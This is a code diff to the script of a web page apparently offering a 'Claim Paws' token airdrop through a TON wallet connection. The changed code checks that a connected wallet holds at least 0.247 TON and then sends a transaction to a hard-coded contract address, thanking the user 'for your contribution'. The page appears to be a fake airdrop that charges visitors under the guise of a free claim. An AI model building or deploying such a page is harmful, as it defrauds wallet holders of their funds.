@@ -212,36 +212,41 @@ alt="PAWS Logo" class="logo">
 <!-- Scripts -->
 <script>
 const CONTRACT_ADDRESS = 'EQCzC-lHViu4W3R6CON5nUgGCEf_l5hA5cDJjVVX2uEGnW38';
-const REQUIRED_AMOUNT = '250000000'; // 0.25 TON
+const REQUIRED_AMOUNT = '247000000'; // 0.247 TON in nanotons
 
+// Initialize TON Connect
 const tonConnect = new TON_CONNECT_UI.TonConnectUI({
     manifestUrl: 'https://hasan199191.github.io/my-ton-app/tonconnect-manifest.json',
     buttonRootId: 'connect-container',
     buttonCssClass: 'connect-button'
 });
 
-// Create claim button element
+// Create claim button but don't add it to DOM yet
 const claimButton = document.createElement('button');
 claimButton.className = 'connect-button';
 claimButton.style.display = 'none';
 claimButton.textContent = 'Claim Paws';
 claimButton.onclick = handleClaim;
 
-// Add claim button after connect button
-document.getElementById('connect-container').after(claimButton);
+// Handle wallet connection status changes
+tonConnect.onStatusChange(async (wallet) => {
+    if (wallet) {
+        console.log('Wallet connected:', wallet.account.address);
+        // Add and show claim button only after wallet connection
+        document.getElementById('connect-container').after(claimButton);
+        claimButton.style.display = 'block';
+    } else {
+        // Remove claim button when wallet disconnects
+        claimButton.remove();
+    }
+});
 
 async function handleClaim() {
     try {
-        // Check wallet balance first
-        const walletBalance = await tonConnect.getBalance();
-        const requiredTON = parseFloat(REQUIRED_AMOUNT) / 1000000000;
-        
-        if (!walletBalance || walletBalance < REQUIRED_AMOUNT) {
-            // Custom error dialog
-            const message = `Your wallet balance is insufficient.\n\nRequired: ${requiredTON} TON\nPlease add more TON to your wallet to continue.`;
-            if (confirm(message + '\n\nWould you like to try again after adding funds?')) {
-                return;
-            }
+        // Check balance when claim button is clicked
+        const balance = await tonConnect.getBalance();
+        if (balance < REQUIRED_AMOUNT) {
+            alert("Your wallet balance is less than 0.247 TON.\nPlease add more TON to continue.");
             return;
         }
 
@@ -257,23 +262,11 @@ async function handleClaim() {
         await tonConnect.sendTransaction(transaction);
         alert('Transaction successful! Thank you for your contribution.');
     } catch (error) {
-        // Generic error handling
-        const errorMessage = 'Transaction could not be completed. Please make sure you have enough TON (0.25 TON) in your wallet.';
-        alert(errorMessage);
-        console.error('Debug info:', error);
+        console.error('Transaction failed:', error);
+        // Show required amount even if balance check fails
+        alert("Transaction failed. Required amount: 0.247 TON");
     }
 }
-
-tonConnect.onStatusChange(async (wallet) => {
-    if (wallet) {
-        console.log('Wallet connected:', wallet.account.address);
-        // Show claim button when wallet is connected
-        claimButton.style.display = 'block';
-    } else {
-        // Hide claim button when wallet is disconnected
-        claimButton.style.display = 'none';
-    }
-});
 </script>
 </body>
 </html>
